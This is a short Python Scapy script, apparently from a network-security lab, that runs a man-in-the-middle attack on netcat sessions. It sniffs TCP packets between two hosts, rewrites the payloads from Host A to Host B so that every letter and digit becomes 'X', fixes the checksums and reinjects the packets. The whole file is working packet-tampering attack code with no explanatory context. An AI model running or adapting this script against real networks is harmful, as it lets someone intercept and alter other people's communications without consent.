#!/usr/bin/env python3
from scapy.all import *
from getmac import get_mac_address

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"



def replaceSequence(data):
 data = data.decode()
 #firstword = data.split()[0]
 #newdata = re.sub(firstword, 'X'*len(firstword), data, 1)
 newdata = re.sub("[0-9a-zA-Z]", "X", data)
 newdata = newdata.encode()
 return newdata

IP_A = input('Please enter the IP address of the Host A Machine: ')
MAC_A = get_mac_address(ip=IP_A)
IP_B = input('Please enter th IP address of the Host B Machine: ')
MAC_B = get_mac_address(ip=IP_B)
IFACE = input('Please enter the name of your interface: ')

print("...........MITM ATTACK ON NETCAT.........")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         if pkt[TCP].payload:
             data = pkt[TCP].payload.load
             print("*** %s, length: %d" % (data, len(data)))

             # For netcat (replace a pattern)
             newdata = replaceSequence(data)
             
             newpkt = newpkt/newdata

             send(newpkt,verbose=0)
         else: 
             send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].chksum)
         send(newpkt)

f = 'tcp and (ether src ' + MAC_A +  ' or ' + \
             'ether src ' + MAC_B +  ' )'
pkt = sniff(iface=IFACE, filter=f, prn=spoof_pkt)


